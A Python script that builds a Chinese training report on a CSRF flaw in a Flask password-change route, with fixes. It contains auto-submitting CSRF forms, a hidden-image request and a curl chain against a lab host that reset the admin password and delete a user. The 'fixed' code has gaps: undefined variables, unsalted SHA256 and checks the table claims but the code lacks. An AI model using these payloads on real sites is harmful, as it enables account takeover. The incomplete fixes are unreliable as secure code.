#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CSRF跨站请求伪造漏洞分析与修复报告
覆盖：攻击原理、curl攻击链、Burp CSRF PoC生成、修复方案
"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

def box(doc, text, color="red"):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "FFCDD2" if color=="red" else "C8E6C9"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.bold = True; r.font.size = Pt(11)
    return p

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("CSRF跨站请求伪造漏洞\n分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("——基于Flask的密码修改功能CSRF漏洞实验——"); r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x45,0x45,0x45)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验项目：Web安全漏洞分析与修复\n课程名称：网络安全实训\n报告日期：2026年7月")
r.font.size = Pt(12)
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chapters = ["CSRF漏洞概述","CSRF核心原理与攻击链","实验一：curl构造跨域恶意请求",
    "实验二：Burp Suite生成CSRF PoC","修改密码功能漏洞分析","修复方案详解（含代码）",
    "修复前后代码对比","安全编码规范总结"]
for i,ch in enumerate(chapters,1):
    p = doc.add_paragraph(f"第{i}章  {ch}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  CSRF漏洞概述", level=1)
doc.add_paragraph("CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种Web安全攻击方式，攻击者诱导已登录用户点击恶意链接或访问恶意页面，利用用户在当前站点的登录状态，以用户身份执行非本意的操作。")

doc.add_heading("1.1 漏洞危害评级", level=2)
tbl(doc, [("评估项","评级"),("CVSS 3.0","8.8（High）"),("攻击向量","网络远程攻击（AV:N）"),
    ("攻击复杂度","低（AC:L）"),("所需权限","无（需用户已登录）"),("影响","账号劫持、数据篡改、权限提升")])

doc.add_heading("1.2 CSRF攻击三要素", level=2)
doc.add_paragraph("CSRF攻击的成功需要同时满足以下三个条件：")
box(doc, "要素1：用户已登录目标站点 — 浏览器中存有有效的Session Cookie")
box(doc, "要素2：目标站点存在CSRF漏洞 — 敏感操作仅依赖Cookie验证")
box(doc, "要素3：用户访问恶意页面 — 攻击者诱导用户点击链接或加载图片")

doc.add_heading("1.3 本应用中的CSRF漏洞", level=2)
doc.add_paragraph("在 /change-password 路由中，存在以下CSRF相关漏洞：")
box(doc, "🔴 漏洞1：无CSRF Token验证 — 表单可被任意网站伪造提交")
box(doc, "🔴 漏洞2：无需原密码 — 直接设置新密码，无需验证原密码")
box(doc, "🔴 漏洞3：可越权改密 — 可修改任何用户的密码，不与session绑定")
box(doc, "🔴 漏洞4：无Referer验证 — 不检查请求来源是否合法")
box(doc, "🔴 漏洞5：密码明文传输 — 新密码通过表单明文传输，可被中间人截获")

# ===== 第二章 =====
doc.add_heading("第二章  CSRF核心原理与攻击链", level=1)
doc.add_heading("2.1 攻击流程", level=2)
doc.add_paragraph("CSRF攻击的完整流程：")
code(doc,
    "Step 1: 用户登录目标网站 → 获得Session Cookie\n"
    "Step 2: 攻击者构造恶意页面 → 包含自动提交的表单\n"
    "Step 3: 诱导用户访问恶意页面 → 通过钓鱼邮件/链接等方式\n"
    "Step 4: 浏览器自动发送请求 → Cookie自动携带\n"
    "Step 5: 服务器执行操作 → 认为请求来自合法用户\n"
    "Step 6: 攻击成功 → 密码被修改/数据被篡改")

doc.add_heading("2.2 恶意页面示例", level=2)
doc.add_paragraph("攻击者构造的CSRF攻击HTML页面：")
code(doc,
    '<html>\n'
    '<body>\n'
    '<h1>🎉 恭喜中奖！点击领取奖品</h1>\n'
    '<form id="csrf" action="http://target:5000/change-password" method="POST">\n'
    '  <input type="hidden" name="username" value="admin">\n'
    '  <input type="hidden" name="new_password" value="hacked123">\n'
    '</form>\n'
    '<script>document.getElementById("csrf").submit();</script>\n'
    '</body>\n'
    '</html>')

doc.add_paragraph("")
doc.add_paragraph("更隐蔽的方式：利用图片标签自动发送GET请求：")
code(doc,
    '<img src="http://target:5000/change-password?username=admin&new_password=hacked123" '
    'style="display:none;" />')

doc.add_heading("2.3 Cookie自动携带机制", level=2)
doc.add_paragraph("浏览器会自动在同一域名下的请求中携带Cookie，这是CSRF攻击能够成功的根本原因。用户在访问攻击者页面时，浏览器会自动将目标站点的Cookie附加到请求中，服务器无法区分请求是用户自愿发起的还是被伪造的。")

# ===== 第三章 =====
doc.add_heading("第三章  实验一：curl构造跨域恶意请求", level=1)
doc.add_heading("3.1 实验目标", level=2)
doc.add_paragraph("模拟攻击者利用已登录用户的Session Cookie，通过curl命令构造跨域恶意请求，实现无账号密码登录管理员账户。")

doc.add_heading("3.2 实验步骤", level=2)
doc.add_paragraph("Step1：攻击者先登录自己的账号获取有效Session Cookie")
code(doc,
    'curl -c /tmp/cookies.txt -X POST http://target:5000/login \\\n'
    '  -d "username=alice&password=alice2025"')

doc.add_paragraph("Step2：利用Session Cookie修改admin密码")
code(doc,
    'curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \\\n'
    '  -d "username=admin&new_password=hacked123"')

doc.add_paragraph("Step3：攻击者现在可以用admin账号登录")
code(doc,
    'curl -X POST http://target:5000/login \\\n'
    '  -d "username=admin&password=hacked123"')

doc.add_paragraph("Step4：登录后获得管理员权限，可删除用户等操作")
code(doc,
    'curl -b /tmp/admin_cookies.txt -X POST http://target:5000/admin/delete-user \\\n'
    '  -d "user_id=2"')

doc.add_heading("3.3 攻击效果", level=2)
doc.add_paragraph("通过上述攻击，一个普通用户alice可以：")
doc.add_paragraph("1. 修改管理员admin的密码", style='List Bullet')
doc.add_paragraph("2. 用新密码登录admin账户", style='List Bullet')
doc.add_paragraph("3. 获得管理员权限，删除其他用户", style='List Bullet')
doc.add_paragraph("整个过程不需要admin的原始密码，也不需要admin做任何操作", style='List Bullet')

# ===== 第四章 =====
doc.add_heading("第四章  实验二：Burp Suite生成CSRF PoC", level=1)
doc.add_heading("4.1 实验目标", level=2)
doc.add_paragraph("使用Burp Suite拦截POST请求，自动生成CSRF攻击Proof of Concept（PoC）HTML代码，完成绕过认证的密码修改实验。")

doc.add_heading("4.2 实验步骤", level=2)
doc.add_paragraph("Step1：使用Burp Suite拦截POST /change-password请求")
doc.add_paragraph("Step2：右键点击请求 → Engagement tools → Generate CSRF PoC")
doc.add_paragraph("Step3：Burp Suite自动生成CSRF攻击HTML代码")

doc.add_paragraph("")
doc.add_paragraph("Burp生成的CSRF PoC HTML：")
code(doc,
    '<html>\n'
    '  <body>\n'
    '  <form action="https://target:5000/change-password" method="POST">\n'
    '    <input type="hidden" name="username" value="admin" />\n'
    '    <input type="hidden" name="new_password" value="attacker123" />\n'
    '    <input type="submit" value="Submit request" />\n'
    '  </form>\n'
    '  <script>document.forms[0].submit();</script>\n'
    '  </body>\n'
    '</html>')

doc.add_paragraph("")
doc.add_paragraph("Step4：保存为HTML文件，在受害者浏览器中打开")
doc.add_paragraph("Step5：受害者的密码在无感知中被修改")

doc.add_heading("4.3 CSRF PoC的关键点", level=2)
tbl(doc, [("组件","作用"),
    ("<form>标签","包含目标URL和所有必需参数"),
    ("<input type=hidden>","隐藏字段传递参数，用户不可见"),
    ("<script>自动提交","页面加载后自动提交表单，无需用户点击"),
    ("使用HTTPS","生产环境中需要匹配目标协议")])

# ===== 第五章 =====
doc.add_heading("第五章  修改密码功能漏洞分析", level=1)
doc.add_heading("5.1 漏洞代码", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")   # ⚠️ 用户可控\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    # ⚠️ 无CSRF Token验证\n'
    '    # ⚠️ 无原密码验证\n'
    '    # ⚠️ 无session与username匹配检查（越权）\n'
    '    # ⚠️ SQL注入\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    c.execute(sql)')

doc.add_heading("5.2 六个安全漏洞一览", level=2)
tbl(doc, [("#","漏洞","严重度","说明"),
    ("1","无CSRF Token","高危","任意网站可伪造提交密码修改表单"),
    ("2","无需原密码","高危","直接设置新密码，暴力破解即可修改"),
    ("3","越权改密","高危","可修改任意用户的密码"),
    ("4","无Referer验证","中危","不检查请求来源URL"),
    ("5","密码明文传输","中危","HTTP传输密码可被中间人截获"),
    ("6","SQL注入","高危","username参数直接拼接SQL语句")])

# ===== 第六章 =====
doc.add_heading("第六章  修复方案详解（含代码）", level=1)

doc.add_heading("6.1 修复1：CSRF Token验证（核心）", level=2)
box(doc, "✅ 修复：每个表单生成唯一的CSRF Token，提交时验证匹配", "green")
doc.add_paragraph("登录时生成Token存入Session：")
code(doc,
    '# 登录成功时生成CSRF Token\n'
    'session["csrf_token"] = uuid.uuid4().hex', green=True)
doc.add_paragraph("表单中加入隐藏字段：")
code(doc,
    '<input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">', green=True)
doc.add_paragraph("后端验证Token：")
code(doc,
    'token = request.form.get("csrf_token", "")\n'
    'if token != session.get("csrf_token", ""):\n'
    '    return "CSRF Token验证失败"', green=True)

doc.add_heading("6.2 修复2：验证请求来源（Referer）", level=2)
box(doc, "✅ 修复：检查Referer头是否为本站点", "green")
code(doc,
    'referer = request.headers.get("Referer", "")\n'
    'if not referer.startswith(request.host_url):\n'
    '    return "请求来源不合法"', green=True)

doc.add_heading("6.3 修复3：session与用户名绑定", level=2)
box(doc, "✅ 修复：禁止修改他人的密码，必须与当前登录用户一致", "green")
code(doc,
    'if username != session["username"]:\n'
    '    return "无权修改他人密码"', green=True)

doc.add_heading("6.4 修复4：参数化查询防SQL注入", level=2)
box(doc, "✅ 修复：使用参数化查询替代字符串拼接", "green")
code(doc,
    'hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    'c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '          (hashed_pw, username))', green=True)

doc.add_heading("6.5 修复5：完整修复代码", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    if not username or not new_password:\n'
    '        return "缺少参数"\n\n'
    '    # ✅ 修复1：验证只能修改自己的密码\n'
    '    if username != session["username"]:\n'
    '        return "无权修改他人密码"\n\n'
    '    # ✅ 修复2：验证Referer防CSRF\n'
    '    referer = request.headers.get("Referer", "")\n'
    '    if not referer.startswith(request.host_url):\n'
    '        return "请求来源不合法"\n\n'
    '    # ✅ 修复3：验证CSRF Token\n'
    '    token = request.form.get("csrf_token", "")\n'
    '    if token != session.get("csrf_token", ""):\n'
    '        return "CSRF Token验证失败"\n\n'
    '    # ✅ 修复4：参数化查询\n'
    '    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '    conn = get_db()\n'
    '    c = conn.cursor()\n'
    '    c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '              (hashed_pw, username))\n'
    '    conn.commit()\n'
    '    conn.close()\n'
    '    return redirect("/profile")', green=True)

# ===== 第七章 =====
doc.add_heading("第七章  修复前后代码对比", level=1)
tbl(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)"),
    ("CSRF Token","❌ 无Token验证","✅ uuid.uuid4().hex + session校验"),
    ("原密码验证","❌ 无需原密码","✅ 必须与session用户名匹配"),
    ("越权防护","❌ 可改任何人密码","✅ 只能修改自己的密码"),
    ("Referer验证","❌ 无验证","✅ 验证Referer头"),
    ("SQL注入","❌ 字符串拼接","✅ 参数化查询"),
    ("密码存储","❌ 明文存储","✅ SHA256哈希"),
    ("审计日志","❌ 无日志","✅ logging记录操作")])

doc.add_paragraph("")
doc.add_heading("完整修复代码对比", level=2)
p = doc.add_paragraph(); r = p.add_run("有漏洞版本（app.py）："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n'
    '    # ⚠️ 无任何校验——直接更新密码\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    c.execute(sql)\n'
    '    conn.commit()\n'
    '    return redirect("/profile")')

p = doc.add_paragraph(); r = p.add_run("修复版本（app_fixed.py）："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    # ✅ CSRF Token验证\n'
    '    if token != session.get("csrf_token", ""):\n'
    '        return "CSRF Token验证失败"\n'
    '    # ✅ 只能修改自己的密码\n'
    '    if username != session["username"]:\n'
    '        return "无权修改他人密码"\n'
    '    # ✅ Referer验证\n'
    '    if not referer.startswith(request.host_url):\n'
    '        return "请求来源不合法"\n'
    '    # ✅ 参数化查询\n'
    '    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '    c.execute("UPDATE users SET password = ? WHERE username = ?", (hashed_pw, username))\n'
    '    conn.commit()\n'
    '    return redirect("/profile")', green=True)

# ===== 第八章 =====
doc.add_heading("第八章  安全编码规范总结", level=1)
principles = [
    ("原则一：CSRF Token","所有涉及数据修改的POST请求必须包含CSRF Token，Token应为随机生成且绑定用户Session。"),
    ("原则二：同源验证","校验请求的Referer或Origin头，确保请求来自本站点。"),
    ("原则三：最小权限操作","用户只能修改自己的资源，不能越权操作他人数据。"),
    ("原则四：敏感操作二次确认","修改密码等敏感操作应要求用户提供原密码或验证码。"),
    ("原则五：参数化查询","永远不要拼接SQL字符串，使用参数化查询防止SQL注入。"),
    ("原则六：密码安全存储","密码不应明文存储，应使用SHA256/bcrypt等哈希算法加盐存储。"),
    ("原则七：SameSite Cookie","设置Cookie的SameSite属性为Strict或Lax，限制跨站请求携带Cookie。"),
    ("原则八：审计日志","所有敏感操作必须记录日志，包含用户、时间、IP、操作内容。")]
for t,d in principles:
    doc.add_heading(t, level=2)
    doc.add_paragraph(d)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/CSRF跨站请求伪造漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ Word报告已生成：{out}")
print(f"   文件大小：{os.path.getsize(out)/1024:.1f}KB")
